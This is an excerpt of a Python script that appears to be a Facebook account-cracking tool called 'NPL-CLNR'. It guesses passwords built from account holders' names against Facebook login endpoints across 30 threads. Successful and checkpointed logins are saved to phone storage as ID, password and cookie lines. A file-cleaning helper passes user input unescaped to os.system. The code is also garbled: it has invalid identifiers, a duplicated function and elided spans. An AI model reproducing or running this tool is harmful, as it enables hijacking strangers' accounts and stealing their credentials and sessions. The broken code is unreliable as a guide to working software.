...
from concurrent.futures import ThreadPoolExecutor as NPL-CLNRssb
from string import * 
...
logo = """            
\ _      _____ ____  ____  _     _    ____  _     ____  _      _____ ____ 
/ \  /|/  __//  __\/  _ \/ \   / \  /   _\/ \   /  _ \/ \  /|/  __//  __\
| |\ |||  \  |  \/|| / \|| |   | |  |  /  | |   | / \|| |\ |||  \  |  \/|
| | \|||  /_ |  __/| |-||| |_/\| |  |  \_ | |_/\| \_/|| | \|||  /_ |    /
\_/  \|\____\\_/   \_/ \|\____/\_/  \____/\____/\____/\_/  \|\____\\_/\_\---------------------------- """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back NPL-CLNR Menu ")
        exit()
...
class main_crack():
    ...
    def crack(self,id):
        ...
        try:
            ...
            print('Opps File Not Found lado kha ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NP CLNR] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [NPL-CLNR-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NP CLNR_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [NPL-CLNR-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/NPL-CLNR_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NPL-CLNR] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NPL-CLNR] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    #  print(f"\r{A} [NPL-CLNR_CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/NPL CLNT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[NPL-CLNR] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [NPL-CLNR-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NPL-CLNR_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with NPL-CLNRssb(max_workers=30) as ssbworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def cutter():
    ...
    print(" ")
    NPL-CLNR = input('Saving Put File Name :')
    os.system('touch ' +NPL-CLNR)
    os.system('sort -r '+ssb+' | uniq > '+NPL-CLNR)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + ssb )
    print(47*'-')
    print("File Saved To :" + NPL-CLNR )
    print(47*'-')
...
def cutter():
    ...
    print(logo)
    print("Removed Successful From File: " + ssb )
    print("New File Saved:" + NPL-CLNR )
    print(47*'-')
    input(f"{S} Press Enter To Back NPL-CLNR Menu ")
    NPL-CLNR(allkey)       
